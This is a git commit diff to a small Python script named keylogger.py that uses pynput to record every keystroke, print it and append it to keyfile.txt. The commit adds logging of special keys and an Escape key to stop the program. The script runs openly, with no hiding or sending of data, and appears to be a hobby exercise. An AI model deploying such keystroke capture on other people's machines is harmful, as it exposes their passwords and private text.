d22f238ce3338ec61d69fd52ccef6ce5314bbf12
Kopano <142087043+Pano111@users.noreply.github.com>
2025-04-07 12:33:40 +0200

    escape key to terminate the program is now added

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,22 @@
 from pynput import keyboard
 
 def keyPressed(key):
-    print(str(key))
+    print(f"Key pressed: {key}")
     with open("keyfile.txt", 'a') as logKey:
         try:
             char = key.char
             logKey.write(char)
         except:
-            print("Error getting char!")
+            logKey.write(f'[{key}]')  
+            print("Special key pressed.")
+
+    
+    if key == keyboard.Key.esc:
+        print("Escape key detected. Terminating the program...")
+        return False 
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+    print("Program is now running. Press 'Esc' to stop it.")
+    with keyboard.Listener(on_press=keyPressed) as listener:
+        listener.join()  
+    print("Program has been terminated.")
